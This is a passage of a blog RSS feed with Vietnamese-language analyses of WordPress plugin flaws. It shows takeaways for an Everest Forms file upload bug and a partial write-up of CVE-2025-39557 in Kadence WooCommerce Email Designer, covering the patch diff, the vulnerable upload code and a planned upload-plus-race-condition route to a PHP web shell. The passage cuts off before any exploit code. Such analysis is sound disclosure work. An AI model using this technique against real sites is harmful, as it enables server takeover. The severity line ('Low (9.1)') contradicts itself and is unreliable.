2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng trong &lt;code&gt;EVF_Form_Fields_Upload::format()&lt;/code&gt; cho phép tải lên, đọc và xóa tệp tùy ý do thiếu kiểm tra kiểu tệp và đường dẫn đúng cách. Mặc dù plugin có cảnh báo lỗi khi phát hiện tệp không hợp lệ, luồng xử lý không dừng và vẫn gọi &lt;code&gt;rename()&lt;/code&gt; để di chuyển tệp vào thư mục public — dẫn đến khả năng đưa mã thực thi lên server (RCE), tiết lộ dữ liệu nhạy cảm hoặc chiếm quyền quản trị site. Bản vá (≥ 3.0.9.5) đã khắc phục bằng cách dừng luồng khi phát hiện tệp không hợp lệ, nhưng các site chưa cập nhật vẫn rất dễ bị lợi dụng.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaway&#34;&gt;&lt;span&gt;Key Takeaway&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaway&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Thiếu kiểm tra chặt chẽ kiểu/đuôi file dẫn đến nguy cơ upload file thực thi.&lt;/li&gt;&#xA;&lt;li&gt;Phát hiện file không hợp lệ nhưng không dừng luồng xử lý cho phép kẻ tấn công bypass.&lt;/li&gt;&#xA;&lt;li&gt;Validation vô nghĩa nếu không kèm hành động chặn (stop/exit/wp_die) trước khi thao tác filesystem.&lt;/li&gt;&#xA;&lt;li&gt;Cần kiểm tra cả nội dung (MIME/content), không chỉ dựa vào tên/extension do client cung cấp.&lt;/li&gt;&#xA;&lt;li&gt;Ngăn thực thi PHP trong thư mục &lt;code&gt;uploads&lt;/code&gt; và dùng API upload an toàn (ví dụ &lt;code&gt;wp_handle_upload()&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/everest-forms/vulnerability/wordpress-everest-forms-plugin-3-0-9-4-unauthenticated-arbitrary-file-upload-read-and-deletion-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Everest Forms Plugin &amp;lt;= 3.0.9.4 is vulnerable to Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-39557 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-08-cve-2025-39557/</link>
      <pubDate>Sat, 08 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-08-cve-2025-39557/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-08-cve-2025-39557/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;Arbitrary File Upload&lt;/strong&gt; trong &lt;strong&gt;Ben Ritner - Kadence WP Kadence WooCommerce Email Designer&lt;/strong&gt; cho phép &lt;strong&gt;Upload một Web Shell lên Web Server&lt;/strong&gt;. Vấn đề này ảnh hưởng đến &lt;strong&gt;Kadence WooCommerce Email Designer&lt;/strong&gt; từ phiên bản &lt;strong&gt;không xác định cho đến 1.5.14&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-39557&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-39557&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.5.14&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.5.15&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (9.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Administrator&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/kadence-woocommerce-email-designer/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Kadence WooCommerce Email Designer Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Kadence WooCommerce Email Designer&lt;/strong&gt;: &lt;strong&gt;1.5.14&lt;/strong&gt; (vulnerable) và &lt;strong&gt;1.5.15&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://wordpress.org/plugins/woocommerce/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;WooCommerce Plugin&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;static private function import_woomail( $wp_customize ) {&#xA;  ...&#xA;  $overrides = array( &amp;#39;test_form&amp;#39; =&amp;gt; false, &amp;#39;test_type&amp;#39; =&amp;gt; false, &amp;#39;mimes&amp;#39; =&amp;gt; array( &amp;#39;dat&amp;#39; =&amp;gt; &amp;#39;text/plain&amp;#39;, &amp;#39;json&amp;#39; =&amp;gt; &amp;#39;text/plain&amp;#39; ) );&#xA;  $file = wp_handle_upload( $_FILES[&amp;#39;kadence-woomail-import-file&amp;#39;], $overrides );&#xA;  ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phiên bản lỗi, hàm &lt;code&gt;import_woomail()&lt;/code&gt; gọi đến &lt;code&gt;wp_handle_upload()&lt;/code&gt; để upload file vào thư mục upload chính thức của WordPress (&lt;code&gt;wp-content/uploads/&amp;lt;year&amp;gt;/&amp;lt;month&amp;gt;/&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Lỗi&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Tuy nhiên, tùy chọn &lt;code&gt;test_type =&amp;gt; false&lt;/code&gt; khiến WordPress &lt;strong&gt;bỏ qua việc kiểm tra MIME Type&lt;/strong&gt; dựa trên whitelist hợp lệ.&#xA;Điều này cho phép kẻ tấn công &lt;strong&gt;upload các tệp nguy hiểm như web shell &lt;code&gt;.php&lt;/code&gt;&lt;/strong&gt; lên máy chủ.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;static private function import_woomail( $wp_customize ) {&#xA;  ...&#xA;  $overrides               = array( &amp;#39;test_form&amp;#39; =&amp;gt; false, &amp;#39;test_type&amp;#39; =&amp;gt; true, &amp;#39;mimes&amp;#39; =&amp;gt; array( &amp;#39;dat&amp;#39; =&amp;gt; &amp;#39;text/plain&amp;#39;, &amp;#39;json&amp;#39; =&amp;gt; &amp;#39;text/plain&amp;#39; ) );&#xA;  $file                    = wp_handle_upload( $_FILES[&amp;#39;kadence-woomail-import-file&amp;#39;], $overrides );&#xA;  ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đã thay đổi tùy chọn &lt;code&gt;&#39;test_type&#39; =&amp;gt; true&lt;/code&gt; nên kích hoạt kiểm tra MIME theo whitelist, ngăn upload tệp nguy hiểm như web shell &lt;code&gt;.php&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;static private function import_woomail( $wp_customize ) {&#xA;  // Make sure we have a valid nonce.&#xA;  if ( ! wp_verify_nonce( $_REQUEST[&amp;#39;kt-woomail-import&amp;#39;], &amp;#39;kt-woomail-importing&amp;#39; ) ) {&#xA;    return;&#xA;  }&#xA;  // Make sure WordPress upload support is loaded.&#xA;  if ( ! function_exists( &amp;#39;wp_handle_upload&amp;#39; ) ) {&#xA;    require_once( ABSPATH . &amp;#39;wp-admin/includes/file.php&amp;#39; );&#xA;  }&#xA;  // Load the export/import option class.&#xA;  require_once KT_WOOMAIL_PATH . &amp;#39;includes/class-kadence-woomail-import-option.php&amp;#39;;&#xA;  // Setup global vars.&#xA;  global $wp_customize;&#xA;  global $kt_woomail_import_error;&#xA;&#xA;  // Setup internal vars.&#xA;  $kt_woomail_import_error = false;&#xA;  $template                = &amp;#39;kadence-woomail-designer&amp;#39;;&#xA;  $overrides               = array( &amp;#39;test_form&amp;#39; =&amp;gt; false, &amp;#39;test_type&amp;#39; =&amp;gt; false, &amp;#39;mimes&amp;#39; =&amp;gt; array( &amp;#39;dat&amp;#39; =&amp;gt; &amp;#39;text/plain&amp;#39;, &amp;#39;json&amp;#39; =&amp;gt; &amp;#39;text/plain&amp;#39; ) );&#xA;  $file                    = wp_handle_upload( $_FILES[&amp;#39;kadence-woomail-import-file&amp;#39;], $overrides );&#xA;&#xA;  // Make sure we have an uploaded file.&#xA;  if ( isset( $file[&amp;#39;error&amp;#39;] ) ) {&#xA;    $kt_woomail_import_error = $file[&amp;#39;error&amp;#39;];&#xA;    return;&#xA;  }&#xA;  if ( ! file_exists( $file[&amp;#39;file&amp;#39;] ) ) {&#xA;    $kt_woomail_import_error = __( &amp;#39;Error importing settings! Please try again.&amp;#39;, &amp;#39;kadence-woocommerce-email-designer&amp;#39; );&#xA;    return;&#xA;  }&#xA;  // Get the upload data.&#xA;  $raw  = file_get_contents( $file[&amp;#39;file&amp;#39;] );&#xA;  $data = json_decode( $raw, true );&#xA;  // Check for support of older export files. Will remove later.&#xA;  if ( ( &amp;#39;array&amp;#39; != gettype( $data ) || ! isset( $data[&amp;#39;template&amp;#39;] ) ) &amp;amp;&amp;amp; version_compare( phpversion(), &amp;#39;7.0.0&amp;#39; ) &amp;gt;= 0  ) {&#xA;    $data = @unserialize( base64_decode( $raw ), array( &amp;#39;allowed_classes&amp;#39; =&amp;gt; false ) );&#xA;    if ( &amp;#39;array&amp;#39; != gettype( $data ) || ! isset( $data[&amp;#39;template&amp;#39;] ) ) {&#xA;      $data = self::mb_unserialize( $raw );&#xA;    }&#xA;  }&#xA;  // Remove the uploaded file.&#xA;  unlink( $file[&amp;#39;file&amp;#39;] );&#xA;  ...&#xA;  exit;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;import_woomail()&lt;/code&gt; có nhiệm vụ xử lý tải lên và nhập dữ liệu cấu hình cho plugin &lt;code&gt;Kadence WooCommerce Email Designer&lt;/code&gt;, cụ thể:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Kiểm tra nonce để đảm bảo yêu cầu hợp lệ, tránh &lt;strong&gt;CSRF attack&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! wp_verify_nonce( $_REQUEST[&amp;#39;kt-woomail-import&amp;#39;], &amp;#39;kt-woomail-importing&amp;#39; ) ) {&#xA;&#x9;return;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi search với từ khóa &lt;code&gt;kt-woomail-import&lt;/code&gt; trong thư mục plugin&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-08-cve-2025-39557/nonce_create.png&#34; title=&#34;Cách nonce được tạo&#34; data-thumbnail=&#34;/posts/2025-11-08-cve-2025-39557/nonce_create.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce Create&lt;/h2&gt;&lt;p&gt;Cách nonce được tạo&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-08-cve-2025-39557/nonce_create.png&#39; alt=&#34;Nonce Create&#34; height=&#34;293&#34; width=&#34;1432&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Cách nonce được tạo&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Nonce được tạo với name là &lt;code&gt;kt-woomail-import&lt;/code&gt;, tức &lt;code&gt;nonce&lt;/code&gt; được đặt trong mã nguồn trả về khi sử dụng chức năng của plugin, ta sử dụng chức năng này và lấy &lt;code&gt;nonce&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-08-cve-2025-39557/nonce_get.png&#34; title=&#34;Cách lấy nonce trong mã nguồn trả về&#34; data-thumbnail=&#34;/posts/2025-11-08-cve-2025-39557/nonce_get.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce Get&lt;/h2&gt;&lt;p&gt;Cách lấy nonce trong mã nguồn trả về&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-08-cve-2025-39557/nonce_get.png&#39; alt=&#34;Nonce Get&#34; height=&#34;829&#34; width=&#34;1444&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Cách lấy nonce trong mã nguồn trả về&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Thực hiện upload file bằng &lt;code&gt;wp_handle_upload()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$overrides = array( &amp;#39;test_form&amp;#39; =&amp;gt; false, &amp;#39;test_type&amp;#39; =&amp;gt; false, &amp;#39;mimes&amp;#39; =&amp;gt; array( &amp;#39;dat&amp;#39; =&amp;gt; &amp;#39;text/plain&amp;#39;, &amp;#39;json&amp;#39; =&amp;gt; &amp;#39;text/plain&amp;#39; ) );&#xA;$file = wp_handle_upload( $_FILES[&amp;#39;kadence-woomail-import-file&amp;#39;], $overrides );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Như phân tích ở trên, do triển khai lỗi nên hàm này chấp nhận upload &lt;code&gt;.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Đọc nội dung file upload, thử parse dưới dạng &lt;strong&gt;JSON&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$raw  = file_get_contents( $file[&amp;#39;file&amp;#39;] );&#xA;$data = json_decode( $raw, true );&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Nếu không phải JSON hợp lệ → thử giải mã base64 rồi &lt;code&gt;unserialize()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ( &amp;#39;array&amp;#39; != gettype( $data ) || ! isset( $data[&amp;#39;template&amp;#39;] ) ) &amp;amp;&amp;amp; version_compare( phpversion(), &amp;#39;7.0.0&amp;#39; ) &amp;gt;= 0  ) {&#xA;&#x9;$data = @unserialize( base64_decode( $raw ), array( &amp;#39;allowed_classes&amp;#39; =&amp;gt; false ) );&#xA;&#x9;if ( &amp;#39;array&amp;#39; != gettype( $data ) || ! isset( $data[&amp;#39;template&amp;#39;] ) ) {&#xA;&#x9;&#x9;$data = self::mb_unserialize( $raw );&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;Xóa file upload khỏi server&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;unlink( $file[&amp;#39;file&amp;#39;] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ta cần quan tâm các phần sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;graph LR;&#xA;A[Upload File] --&amp;gt; B[Read File &amp;amp; Decode JSON]&#xA;B --&amp;gt; C{IF JSON}&#xA;C --&amp;gt;|True| D[&amp;#34;unserialize()&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;unlink()&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;p&gt;File bị xóa ngay sau khi upload, nên không thể truy cập theo cách thông thường. Tận dụng khoảng thời gian giữa &lt;code&gt;Upload File&lt;/code&gt; và &lt;code&gt;unlink()&lt;/code&gt; để gọi file vừa upload trong khoảng thời gian đó nhằm thực thi web shell. Ta sử dụng kỹ thuật &lt;code&gt;File Upload&lt;/code&gt; + &lt;code&gt;Race Condition&lt;/code&gt;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;pre&gt;&lt;code&gt;static public function import_export_requests( $wp_customize ) {&#xA;  // Check if user is allowed to change values.&#xA;  if ( ! Kadence_Woomail_Designer::is_admin() ) {&#xA;    exit;&#xA;  }&#xA;  if ( isset( $_REQUEST[&amp;#39;kt-woomail-export&amp;#39;] ) ) {&#xA;    self::export_woomail( $wp_customize );&#xA;  }&#xA;  if ( isset( $_REQUEST[&amp;#39;kt-woomail-import&amp;#39;] ) &amp;amp;&amp;amp; isset( $_FILES[&amp;#39;kadence-woomail-import-file&amp;#39;] ) ) {&#xA;    self::import_woomail( $wp_customize );&#xA;  }&#xA;&#xA;  if ( isset( $_REQUEST[&amp;#39;kt-woomail-import-template&amp;#39;] ) ) {&#xA;    self::import_woomail_template( $wp_customize );&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;import_woomail()&lt;/code&gt; được gọi trong hàm &lt;code&gt;import_export_requests()&lt;/code&gt; nếu người dùng là &lt;code&gt;admin&lt;/code&gt; và có tham số &lt;code&gt;kt-woomail-import&lt;/code&gt; trong &lt;code&gt;$_REQUEST&lt;/code&gt; cùng tệp tin được upload trong 